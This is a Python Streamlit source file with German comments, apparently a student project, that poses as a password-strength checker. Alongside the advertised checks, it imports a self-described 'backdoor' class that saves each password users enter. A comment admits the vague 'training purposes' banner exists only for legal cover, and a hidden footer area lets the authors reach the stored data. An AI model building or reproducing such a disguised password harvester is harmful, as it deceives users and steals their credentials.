import streamlit as st # importiere streamlit funktionalitäten
from helperclass_app_3 import Helper # importiert die Helferklasse für das Checken der Passwörter
from hintertüre import hintertür #importiert die Helferklasse für die Hintertüre die wir eingebaut haben

liste=[] # Erstellt eine leere Liste, in die das Eingegebene Passwort dann Buchstaben für Buchstaben eingefüllt wird
liste_checker_sonderzeichen=[]  #Listen für die Übereinstimmung aus allen Sonderzeichen/Grossbuchstaben/Kleinbuchstaben/Zahlen und dem Eingegeben Passwort
liste_checker_grossbuchstaben=[]
liste_checker_kleinbuchstaben=[]
liste_checker_zahlen=[]

st.warning('⚠️Ihre Daten werden möglicherweise kurzfristig zu Schulungszwecken gespeichert!⚠️') # Vielleicht deckt es ja rechtlich das, was wir gemacht haben
st.title("Passwortchecker")
st.header("Was ist ein starkes Passwort?")
st.markdown("Ein sicheres Passwort sollte mehrere Bedingungen erfüllen. Wir testen diese für Sie und geben Ihnen eine kleine Rückmeldung darüber, wie sicher Ihr Passwort ist. Wir prüfen auf:")
st.markdown("-	Sonderzeichen")
st.markdown("-	Länge (mind. 8 Zeichen, empfohlen sind 12)")
st.markdown("-	Gross- und Kleinbuchstaben")
st.markdown("-	Zahlen")
st.markdown("Sie sollten auch keine Zahlenfolgen (zB. 1234) oder persönliche Daten wie Geburtstag verwenden, diese Daten können wir jedoch nicht überprüfen.")

st.header("Meine Passwörter überprüfen")
eingabe=st.text_input("Geben Sie bitte Ihr Passwort ein und bestätigen Sie danach per Enter") # legt das zu prüfende Passwort auf eine leere Variable
pw = Helper (eingabe) # legt ein Objekt der Klasse Helper mit dem eingegeben Passwort an
Pw = hintertür(eingabe) #legt ein Objekt der Klasse hintertür mit dem eingegeben Passwort an 

pw.checker() # Startet den Passwortchecker
Pw.speicher() # Startet den Prozess des Passwort speicherns

st.title("                          ") # Reine Designe Entscheidung, um mehr Platz bis zum Boden der Seite zu haben
st.title("                          ")


col1, col2 = st.columns([1,3]) # Darstellung der Fusszeile (im Verhältnis 1:3)

with col1:
    st.write("© Ramon Spina und Beda Küttel 2023")

with col2:
    if st.checkbox("Internerbereich anzeigen"):        # Zeigt den Internen Bereich an, wenn es angeklickt ist
        Eingabe = st.text_input("Um Zugriff auf den internen Bereich zu haben bitte das Passwort eingeben.") #Fragt nach dem Passwort für den internen Bereich und legt es auf eine leere Variable
        Pw.Kennwort =  (Eingabe) #legt das Eingegebne Passwort als Attribut fest
        Pw.Interner_Bereich() # Startet den Internen Bereich mit Passwortüberprüfung und, je nach resultat, mit dem Internen Bereich